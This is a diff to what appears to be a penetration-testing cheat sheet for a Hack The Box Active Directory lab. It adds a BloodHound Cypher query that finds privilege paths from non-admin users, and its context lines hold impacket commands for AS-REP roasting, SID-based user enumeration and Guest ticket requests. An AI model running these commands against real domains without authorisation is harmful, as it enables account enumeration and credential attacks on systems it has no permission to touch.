@@ -113,6 +113,20 @@ impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile use
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 
+[*] Bloodhound
+-->> Privileges: Groups with Users
+MATCH (g:Group)<-[:MemberOf]-(u:User)-[r1]->(n1)-[r2]->(n2)
+WHERE NOT toLower(u.name) CONTAINS "admin"
+  AND NOT toLower(g.name) CONTAINS "admin"
+  AND NOT toLower(n1.name) CONTAINS "admin"
+  AND NOT toLower(n2.name) CONTAINS "admin"
+  AND NOT n1.name ENDS WITH "DOMAIN USERS@INTELLIGENCE.HTB"
+  AND NOT n2.name ENDS WITH "DOMAIN USERS@INTELLIGENCE.HTB"
+  AND NOT toLower(g.name) CONTAINS "guest"
+  AND NOT toLower(u.name) CONTAINS "guest"
+RETURN u, r1, n1, r2, n2
+LIMIT 1000
+
 # Exploitation
 ## Spray Services
 (
